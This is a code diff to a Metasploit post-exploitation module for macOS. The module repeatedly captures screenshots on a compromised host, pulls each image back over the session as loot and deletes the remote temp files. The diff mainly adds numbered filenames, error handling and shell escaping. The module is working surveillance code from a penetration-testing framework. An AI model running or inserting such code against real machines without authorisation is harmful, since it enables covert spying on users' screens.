@@ -41,7 +41,7 @@ class Metasploit3 < Msf::Post
 
   def run
     tmp_path = datastore['TMP_PATH'].shellescape.gsub('random', Rex::Text.rand_text_alpha(8))
-    execute("Create remote temp dir: ", "mkdir -p " + tmp_path)
+    execute("Create remote temp dir: ", "mkdir -p #{tmp_path}")
     if datastore['COUNT'] == nil
       count = 1
     else
@@ -49,34 +49,40 @@ class Metasploit3 < Msf::Post
     end
     if count == 0
       begin
-        get_screenshot("Screenshot", tmp_path)
-        delay()
+        get_screenshot("Screenshot", tmp_path, "screenshot.#{datastore['FILETYPE'].shellescape}")
+        delay
       end until false
     else
+      print_status "Capturing #{count} screenshots with a delay of #{datastore['DELAY']} seconds"
+      # calculate a sane number of leading zeros to use.  log of x  is ~ the number of digits
+      leading_zeros = Math::log10(count).round
       count.times do |num|
         if count == 1
           msg = "Screenshot"
         else
-          msg = "Screenshot " + (num+1).to_s() + "/#{count}"
+          msg = "Screenshot %0#{leading_zeros}d/#{count}" % (num+1)
         end
-        get_screenshot(msg, tmp_path)
-        delay() unless ((num+1) == count)
+        get_screenshot(msg, tmp_path, "screenshot_%0#{leading_zeros}d.#{datastore['FILETYPE'].shellescape}" % (num+1))
+        delay unless ((num+1) == count)
       end
+    rescue IOError, Errno::ENOENT => e
+      print_error("Error storing screenshot: #{e.class} #{e} #{e.backtrace}")
+      return
     end
     execute("Remove remote temp dir: ", "rmdir " + tmp_path)
   end
 
-  def get_screenshot(msg, tmp_path)
-    filename = Rex::Text.rand_text_alpha(7) + "." + datastore['FILETYPE']
+  def get_screenshot(msg, tmp_path, local_filename)
+    filename = Rex::Text.rand_text_alpha(7) + "." + datastore['FILETYPE'].shellescape
     file = tmp_path + "/" + filename
 
     execute("Save screenshot to remote temp folder:", datastore['EXE_PATH'].shellescape + " -C -t " + datastore['FILETYPE'].shellescape + " " + file)
     data = cat_file(file)
-    loot_file = save(msg, data, filename)
+    loot_file = save(msg, data, local_filename)
     execute("Remove remote temp file:", "rm " + file)
   end
 
-  def delay()
+  def delay
     if datastore['DELAY'] != nil && datastore['DELAY'] != 0
       vprint_status("Delaying for " + datastore['DELAY'].to_s() + " seconds")
       Rex.sleep(datastore['DELAY'])
@@ -85,7 +91,7 @@ class Metasploit3 < Msf::Post
 
   def save(msg, data, filename, ctype="image/" + datastore['FILETYPE'])
     ltype = "osx.screenshot"
-    loot_file = store_loot(ltype, ctype, session, data, filename, msg)
+    loot_file = store_loot(ltype, ctype, session, data, filename, 'Screenshot')
     print_good("#{msg} stored in #{loot_file.to_s}")
   end
 
@@ -96,7 +102,7 @@ class Metasploit3 < Msf::Post
   end
 
   def cat_file(filename)
-    print_status("Downloading screenshot: #{filename}")
+    vprint_status("Downloading screenshot: #{filename}")
     data = read_file(filename)
     return data
   end
